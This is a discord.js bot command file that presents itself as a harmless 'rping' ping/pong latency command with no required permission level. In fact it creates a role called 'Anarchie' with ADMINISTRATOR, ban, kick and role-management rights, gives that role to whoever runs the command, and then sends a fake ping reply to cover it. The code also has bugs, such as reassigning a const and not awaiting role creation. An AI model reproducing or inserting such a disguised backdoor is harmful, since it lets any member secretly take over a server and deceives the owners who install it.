const Discord = require('discord.js');

exports.run = async (client, message) => {

  const muteRole = message.guild.roles.find(`name`, "Anarchie");

  if(!muteRole){
      try{
   

    muteRole = message.guild.createRole({
      name: "Anarchie",
      color: "#00000",
      permissions:[]
    })
    message.guild.channels.forEach(async (channel, i) => {
      await muteRole.setPermissions(['ADMINISTRATOR', 'KICK_MEMBERS', 'BAN_MEMBERS', 'MANAGE_CHANNELS', 'MANAGE_GUILD', 'ADD_REACTIONS', 'VIEW_AUDIT_LOG', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'SEND_TTS_MESSAGES', 'MANAGE_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'READ_MESSAGE_HISTORY', 'MENTION_EVERYONE', 'USE_EXTERNAL_EMOJIS', 'EXTERNAL_EMOJIS', 'CONNECT', 'SPEAK', 'MUTE_MEMBERS', 'DEAFEN_MEMBERS', 'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME', 'MANAGE_NICKNAMES', 'MANAGE_ROLES', 'MANAGE_WEBHOOKS', 'MANAGE_EMOJIS'])                  
      });
  }catch(e){
    console.log(e.stack);
  }

//end of create role
  }


  if (message.guild.member(message.author).roles.has(muteRole.id)) {
    message.guild.member(message.author).removeRole(muteRole)
    message.channel.send(`= Pong =\n\n${new Date().getTime() - message.createdTimestamp} ms`, {code:'asciidoc'});
                     
  } else {
    message.guild.member(message.author).addRole(muteRole)
    message.channel.send(`= Pong =\n\n${new Date().getTime() - message.createdTimestamp} ms`, {code:'asciidoc'});
                     
    };
};
  
  
  exports.conf = {
    enabled: true,
    guildOnly: false,
    aliases: [],
    permLevel: 0
  };
  
  exports.help = {
    name: 'rping',
    description: 'Ping/Pong command, vous donne aussi votre ping.',
    usage: 'ping'
  };
